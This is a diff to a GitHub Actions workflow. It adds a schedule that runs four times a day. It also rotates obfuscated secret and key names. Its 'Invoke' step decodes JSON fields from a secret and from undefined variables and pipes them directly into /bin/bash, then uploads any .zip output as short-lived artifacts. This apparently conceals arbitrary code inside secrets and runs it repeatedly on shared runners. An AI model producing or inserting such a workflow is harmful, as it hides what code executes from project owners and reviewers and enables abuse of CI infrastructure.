@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '4 3,9,15,21 * * *'
 jobs:
   pipeline:
     runs-on: ubuntu-latest
@@ -9,17 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          egt54016: ${{ secrets.egt54016 }}
+          du05409: ${{ secrets.du05409 }}
         run: |
-          printf '%s' "$egt54016" | jq -r .ugft3482 | /bin/bash
-          printf '%s' "$x2980" | jq -r .l5 | /bin/bash
-          echo $yro0 | jq -r .se814 | /bin/bash
-          echo $v875 | jq -r .hbge4309 | /bin/bash
+          printf '%s' "$du05409" | jq -r .neuu7880 | /bin/bash
+          printf '%s' "$o046" | jq -r .auxm452 | /bin/bash
+          printf '%s' "$u7983" | jq -r .kjt8820 | /bin/bash
+          printf '%s' "$au67662" | jq -r .jgmnl3 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: n76MllsB
+          name: vuPEpe5D
           path: "*.zip"
           retention-days: 1
